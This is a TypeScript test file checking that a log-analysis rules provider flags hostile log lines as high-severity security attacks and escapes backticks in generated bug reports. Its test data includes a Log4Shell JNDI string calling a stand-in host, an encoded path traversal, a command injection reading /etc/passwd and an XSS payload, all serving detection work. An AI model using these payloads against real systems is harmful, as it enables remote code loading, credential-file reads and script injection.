import { describe, expect, it } from 'vitest';

import { RulesProvider } from './rulesProvider';

const provider = new RulesProvider();

describe('RulesProvider against hostile logs', () => {
  it.each([
    ['a Log4Shell payload', 'GET / "${jndi:ldap://evil.example/a}" 200'],
    ['an encoded path traversal', 'GET /files/%2e%2e%2fetc/passwd HTTP/1.1 404'],
    ['a command injection', 'GET /ping?host=1.1.1.1;cat /etc/passwd HTTP/1.1 200'],
    ['an event-handler XSS', 'GET /search?q=<img src=x onerror=alert(1)> 200'],
  ])('flags %s as a high security attack', async (_name, excerpt) => {
    const report = await provider.analyze({ excerpt, severityHint: 'low' });

    expect(report.category).toBe('Security Attack');
    expect(['high', 'critical']).toContain(report.severity);
  });

  it('keeps a log line made of backticks from closing the code block of the issue', async () => {
    const report = await provider.analyze({
      excerpt: 'ERROR ECONNREFUSED 10.0.0.1:5432 ``` # injected heading',
      severityHint: 'high',
    });

    expect(report.bugReportMarkdown).toContain('````');
  });
});
